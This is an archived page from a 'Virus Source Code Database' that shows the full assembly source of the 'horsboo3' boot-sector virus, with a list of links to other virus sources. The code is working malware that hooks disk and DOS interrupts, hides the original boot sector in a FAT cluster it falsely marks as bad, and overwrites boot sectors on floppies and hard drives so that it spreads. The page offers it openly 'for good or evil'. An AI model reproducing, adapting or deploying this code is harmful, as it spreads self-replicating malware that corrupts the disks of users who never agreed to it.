<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: horsboo3_asm</title>
<meta name="KEYWORDS" content="horsboo3.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for horsboo3.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="hack-83_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-83_asm.php">hack-83_asm</a><br>
<a href="hack_res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack_res_asm.php">hack_res_asm</a><br>
<a href="hack-res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-res_asm.php">hack-res_asm</a><br>
<a href="hacktc2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktc2_asm.php">hacktc2_asm</a><br>
<a href="hacktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic2_asm.php">hacktic2_asm</a><br>
<a href="hacktic__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic__asm.php">hacktic__asm</a><br>
<a href="hacktic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_asm.php">hacktic_asm</a><br>
<a href="hacktic_bat.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_bat.php">hacktic_bat</a><br>
<a href="halechen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/halechen_asm.php">halechen_asm</a><br>
<a href="hamster_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamster_asm.php">hamster_asm</a><br>
<a href="hamtlite_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamtlite_asm.php">hamtlite_asm</a><br>
<a href="hanm2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2249_asm.php">hanm2249_asm</a><br>
<a href="hanm2314_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2314_asm.php">hanm2314_asm</a><br>
<a href="hanm2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2350_asm.php">hanm2350_asm</a><br>
<a href="hanm2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2400_asm.php">hanm2400_asm</a><br>
<a href="hanm2449_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2449_asm.php">hanm2449_asm</a><br>
<a href="hanm2467_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2467_asm.php">hanm2467_asm</a><br>
<a href="hanm2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2471_asm.php">hanm2471_asm</a><br>
<a href="hanm2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2501_asm.php">hanm2501_asm</a><br>
<a href="hanm2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2564_asm.php">hanm2564_asm</a><br>
<a href="hanm2567_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2567_asm.php">hanm2567_asm</a><br>
<a href="hanm2592_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2592_asm.php">hanm2592_asm</a><br>
<a href="hanm2602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2602_asm.php">hanm2602_asm</a><br>
<a href="hanm2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2626_asm.php">hanm2626_asm</a><br>
<a href="hanm2714_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2714_asm.php">hanm2714_asm</a><br>
<a href="hanm2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2715_asm.php">hanm2715_asm</a><br>
<a href="hanm2848_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2848_asm.php">hanm2848_asm</a><br>
<a href="happynyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/happynyb_asm.php">happynyb_asm</a><br>
<a href="harakiri_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/harakiri_pas.php">harakiri_pas</a><br>
<a href="hate_213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate_213_asm.php">hate_213_asm</a><br>
<a href="hate-213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate-213_asm.php">hate-213_asm</a><br>
<a href="hause_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hause_asm.php">hause_asm</a><br>
<a href="havoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/havoc_asm.php">havoc_asm</a><br>
<a href="hcktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hcktic2_asm.php">hcktic2_asm</a><br>
<a href="header_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/header_asm.php">header_asm</a><br>
<a href="heeva_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heeva_asm.php">heeva_asm</a><br>
<a href="heevahav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heevahav_asm.php">heevahav_asm</a><br>
<a href="hellowen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hellowen_asm.php">hellowen_asm</a><br>
<a href="hemlock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hemlock_asm.php">hemlock_asm</a><br>
<a href="hh_h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh_h_asm.php">hh_h_asm</a><br>
<a href="hh&amp;h__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h__asm.php">hh&h__asm</a><br>
<a href="hh&amp;h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h_asm.php">hh&h_asm</a><br>
<a href="hianmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hianmit_asm.php">hianmit_asm</a><br>
<a href="hidos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hidos_asm.php">hidos_asm</a><br>
<a href="highland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/highland_asm.php">highland_asm</a><br>
<a href="hiperion_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiperion_asm.php">hiperion_asm</a><br>
<a href="hitler_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hitler_asm.php">hitler_asm</a><br>
<a href="hiv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv__asm.php">hiv__asm</a><br>
<a href="hiv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv_asm.php">hiv_asm</a><br>
<a href="hiv-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv-b_asm.php">hiv-b_asm</a><br>
<a href="homecmng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/homecmng_asm.php">homecmng_asm</a><br>
<a href="horns_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horns_asm.php">horns_asm</a><br>
<a href="horsb410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsb410_asm.php">horsb410_asm</a><br>
<a href="horsboo1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo1_asm.php">horsboo1_asm</a><br>
<a href="horsboo3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo3_asm.php">horsboo3_asm</a><br>
<a href="horse2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse2_asm.php">horse2_asm</a><br>
<a href="horse5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse5_asm.php">horse5_asm</a><br>
<a href="horse8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse8_asm.php">horse8_asm</a><br>
<a href="horse__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse__asm.php">horse__asm</a><br>
<a href="horse_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse_asm.php">horse_asm</a><br>
<a href="howard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard__asm.php">howard__asm</a><br>
<a href="howard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard_asm.php">howard_asm</a><br>
<a href="hspawn__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn__asm.php">hspawn__asm</a><br>
<a href="hspawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn_asm.php">hspawn_asm</a><br>
<a href="htc_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/htc_pas.php">htc_pas</a><br>
<a href="humgree__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgree__asm.php">humgree__asm</a><br>
<a href="humgreed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgreed_asm.php">humgreed_asm</a><br>
<a href="hydra_0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_0_asm.php">hydra_0_asm</a><br>
<a href="hydra-0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-0_asm.php">hydra-0_asm</a><br>
<a href="hydra_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_1_asm.php">hydra_1_asm</a><br>
<a href="hydra-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-1_asm.php">hydra-1_asm</a><br>
<a href="hydra_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_2_asm.php">hydra_2_asm</a><br>
<a href="hydra-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-2_asm.php">hydra-2_asm</a><br>
<a href="hydra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra2_asm.php">hydra2_asm</a><br>
<a href="hydra_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_3_asm.php">hydra_3_asm</a><br>
<a href="hydra-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-3_asm.php">hydra-3_asm</a><br>
<a href="hydra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra3_asm.php">hydra3_asm</a><br>
<a href="hydra_4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_4_asm.php">hydra_4_asm</a><br>
<a href="hydra-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-4_asm.php">hydra-4_asm</a><br>
<a href="hydra_5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_5_asm.php">hydra_5_asm</a><br>
<a href="hydra-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-5_asm.php">hydra-5_asm</a><br>
<a href="hydra_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_6_asm.php">hydra_6_asm</a><br>
<a href="hydra-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-6_asm.php">hydra-6_asm</a><br>
<a href="hydra_7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_7_asm.php">hydra_7_asm</a><br>
<a href="hydra-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-7_asm.php">hydra-7_asm</a><br>
<a href="hydra_8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_8_asm.php">hydra_8_asm</a><br>
<a href="hydra-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-8_asm.php">hydra-8_asm</a><br>
<a href="hydra8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra8_asm.php">hydra8_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

	.radix	16
start:
	jmp	begin

	db	'IBM  3.3'
	dw	200
	db	2
	dw	1
	db	2
	dw	70
	dw	2D0
	db	0FDh
	dw	2
	dw	9
	dw	2
	dw	0

work	dd	?
count	db	?
drive	db	?
Fat_sec dw	?
old_boot	dw 666d
flag		db ?
sys_sec dw ?

;Simulate PUSHA

pusha:
	pop	word ptr cs:[sys_sec-start]
	pushf
	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	bp
	push	ds
	push	es
	jmp	word ptr cs:[sys_sec-start]

;Simulate POPA

popa:
	pop	word ptr cs:[sys_sec-start]
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
	jmp	word ptr cs:[sys_sec-start]

;This procedure Reads/Writes the absolute sector in BX
;ES:BP must point I/O buffer

write:
	mov	ah,3
	jmp	short do_it
read:
	mov	ah,2
do_it:
	mov	al,1
	xchg	ax,bx
	add	ax,[001C]	;Hidden sectors
	xor	dx,dx
	div	word ptr [0018]
	inc	dl	;Adjust dl because BIOS counts sectors from 1 (not from 0)
	mov	ch,dl	;dl is the first sector
	xor	dx,dx
	div	word ptr [001A] ;Cylinder  in AX
	mov	cl,6		;Set CX if cylinder is bigger than 512
	shl	ah,cl
	or	ah,ch
	xchg	ax,cx
	xchg	ch,cl
	xchg	dh,dl
	xchg	ax,bx

abs_read:
	xchg	bx,bp
	mov	dl,byte ptr [drive-start] ;dl is the drive
	pushf
	db	9A
orig	dd	?
	jnc	ok_func
	pop	ax
ok_func:
	ret


begin:
	xor	ax,ax	;Virus begining
	mov	bp,7C00
	mov	ds,ax	;Clear ds&ss
	mov	ss,ax
	mov	sp,bp	;Set SP bellow virus
	xchg	ax,di
	mov	si,bp
	mov	ax,2000 ;Copy virus somewhere in memory
	mov	es,ax
	mov	cx,0100
	rep	movsw
	push	es
	mov	ax,offset here-start
	push	ax
	retf	;go there


here:
	mov	ax,1234
	cmp	[80*4],ax
	mov	[80*4],ax
	je	skip_this
	les	bx,[1C*4]		;Get old int 1Ch value
	mov	cs:[work-start],bx
	mov	cs:[work-start+2],es
	mov	[1C*4],offset entry_1C-start	;Set new value
	mov	[1C*4+2],cs

skip_this:

	les	bx,[13*4]		;Save original int 13h
	mov	cs:[orig-start],bx
	mov	cs:[orig-start+2],es
	push	cs	;DS=ES=CS
	push	cs
	pop	ds
	pop	es
again:
	mov	ax,offset again-start
	push	ax
	xor	ah,ah		;Initialize Floppy
	mov	byte ptr [flag-start],ah
	int	13
	and	byte ptr [drive-start],80	;Drive A: or C:
	mov	bx,word ptr [old_boot-start]	;Read second part
	mov	bp,offset second-start
	call	read
	mov	bx,word ptr [old_boot-start]
	inc	bx
	xor	ax,ax
	mov	es,ax
	mov	bp,7C00
	call	read		;Read old Boot
	db	0EA,00,7C,00,00 ;JMP 0000:7C00

entry_1C:
	push	si
	push	ds

	xor	si,si
	mov	ds,si
	cmp	[si+21*4],si
	je	not_yet

	push	bx
	push	es

	les	bx,cs:[si+work-start]
	mov	[si+1C*4],bx
	mov	[si+1C*4+2],es
	les	bx,[si+21*4]
	mov	word ptr cs:[si+jmp_21-start],bx
	mov	word ptr cs:[si+jmp_21-start+2],es
	mov	[si+21*4],offset go_on-start
	mov	[si+21*4+2],cs

	pop	es
	pop	bx

not_yet:
	pop	ds
	pop	si
	iret

go_on:
	call	pusha
	cmp	ax,4B00
	je	install
return:
	call	popa

	db	0EA
jmp_21	dd	?

install:

	mov	ah,52
	int	21
	xor	si,si
	xor	di,di
	mov	ds,es:[bx-02]
	mov	bx,ds
	mov	ax,[si+3]
	add	[si+3],96
	inc	bx
	add	ax,bx
	mov	es,ax
	push	es
	mov	ax,es:[si+3]
	sub	ax,96
	push	ax
	mov	ax,[si+3]
	add	ax,bx
	mov	ds,ax
	mov	byte ptr [si],'Z'
	mov	[si+1],si
	pop	[si+3]
	pop	es
	push	cs
	pop	ds
	mov	cx,0200
	rep	movsw
	mov	ax,word ptr [jmp_21-start]
	mov	bx,word ptr [jmp_21-start+2]
	mov	ds,cx
	mov	[21*4],ax
	mov	[21*4+2],bx
	mov	ax,[13*4]
	mov	bx,[13*4+2]
	mov	es:[my-start],ax
	mov	es:[my-start+2],bx
	mov	[13*4],offset real-start
	mov	[13*4+2],es
	jmp	short return


real:
	call	pusha
	cmp	ah,02
	jne	exit
	cmp	dl,81
	ja	exit
	mov	byte ptr cs:[drive-start],dl
check:
	xor	ax,ax
	mov	ds,ax
	mov	byte ptr cs:[flag-start],al
	mov	al,byte ptr [043F]
	push	dx
	test	dl,80
	jz	ok_drive
	sub	dl,7F
	shl	dx,1
	shl	dx,1
	dec	dx
ok_drive:
	inc	dx
	test	al,dl
	pop	dx
	jnz	exit
	push	cs
	push	cs
	pop	es
	pop	ds
	call	infect
exit:
	call	popa
call_cur:
	db	0EA
my	dd	?

ident	dw	01234
	dw	0AA55

	second	label word

	db	'666'

infect:
	push	dx
	xor	ah,ah
	int	1A
	test	dl,01
	pop	dx
	jz	bad
	mov	ax,0201
	mov	dh,0
	mov	cx,0001
	mov	bp,offset buffer-start
	call	abs_read
	test	dl,80
	jz	usual
	mov	bx,offset buffer-start+01BE
	mov	cx,0004
search:
	cmp	byte ptr [bx+4],1
	je	okay
	cmp	byte ptr [bx+4],4
	je	okay
	add	bx,10
	loop	search
	ret

okay:
	mov	dx,[bx]
	mov	cx,[bx+2]
	mov	ax,0201
	mov	bp,offset buffer-start
	call	abs_read
usual:
	mov	si,offset buffer-start+3
	mov	di,0003
	mov	cx,1Bh
	rep	movsb
	cmp	[buffer-start+01FC],1234	;Infected ?
	jne	well
bad:
	ret

well:
	cmp	[0Bh],200				;Bytes in sector
	jne	bad
	cmp	byte ptr [0Dh],2			;Sectors in 1 cluster
	jb	bad
	mov	cx,[0E] ;Reserved dectors
	mov	al,[10] ;Copies of FAT
	cbw
	mul	word ptr [16]				;FAT in sectors
	add	cx,ax
	mov	ax,20					;32 bytes
	mul	word ptr [11]				;Elements in the catalogue
	mov	bx,1FF
	add	ax,bx
	inc	bx
	div	bx
	add	cx,ax
	mov	word ptr [sys_sec-start],cx		;system sectors
	mov	ax,[0013]				;Sectors on the disk
	sub	ax,cx
	mov	bl,[0Dh]				;Sectors in cluster
	xor	dx,dx
	xor	bh,bh
	div	bx
	inc	ax					;AX=clusters on disk
	mov	di,ax
	and	byte ptr [flag-start],0FE
	cmp	ax,0FF0
	jbe	small
	or	byte ptr [flag-start],1
small:
	mov	si,1
	mov	bx,[0E] ;Where to read FAT from
	dec	bx
	mov	[Fat_sec-start],bx
	mov	byte ptr [count-start],0FE

look_here:

	inc	word ptr [Fat_sec-start]	;Next sector in FAT
	mov	bx,[Fat_sec-start]
	add	byte ptr [count-start],2	;Adjust for new offset
	mov	bp,offset buffer-start		;BP points buffer
	call	read				;Read FAT's sector
	jmp	short where

look:
	mov	ax,3	;Multiply by 1.5 rounded down to integer number
	test	byte ptr [flag-start],1
	je	go_1
	inc	ax	;For 16 bit FAT
go_1:
	mul	si
	shr	ax,1
	sub	ah,byte ptr [count-start] ;Adjust offset in range of 512 bytes
	mov	bx,ax
	cmp	bx,1FF	;If reached the end then load next FAT sector
	jnb	look_here
	mov	dx,[bx+buffer-start]	;Information for this cluster
	test	byte ptr [flag-start],01
	jne	go_2
	test	si,1
	je	go_3
	mov	cl,4
	shr	dx,cl
go_3:
	and	dh,0F
go_2:
	or	dx,dx		;Free cluster ?
	jz	found
where:
	inc	si
	cmp	si,di
	jbe	look
	ret

found:
	mov	dx,0FFF7	;Prepare for marking it as bad
	test	byte ptr [flag-start],1
	jnz	go_4
	and	dh,0F
	test	si,1
	je	go_4
	mov	cl,4
	shl	dx,cl
go_4:
	or	[bx+buffer-start],dx	;Set it in FAT
	mov	bx,[Fat_sec-start]
	mov	bp,offset buffer-start
	call	write	;Update 1'st FAT copy
	mov	ax,si	;Convert cluster address in si to sector number
	sub	ax,2
	mov	bl,byte ptr [0Dh]
	xor	bh,bh
	mul	bx
	add	ax,[sys_sec-start]
	mov	si,ax	;Si is the sector that is free
	xor	bx,bx
	mov	bp,offset buffer-start
	call	read	;Read old BOOTSECTOR
	mov	bx,si	;Put it in a quiet place
	inc	bx
	mov	bp,offset buffer-start
	call	write	;Do that
	mov	bx,si
	mov	[old_boot-start],si
	mov	bp,offset second-start
	call	write
	xor	bx,bx
	xor	bp,bp
	call	write
	ret

this_		db	1024d-(this_-start) dup (0F6h)

	buffer label word



</textarea></td></tr></table></body></html>
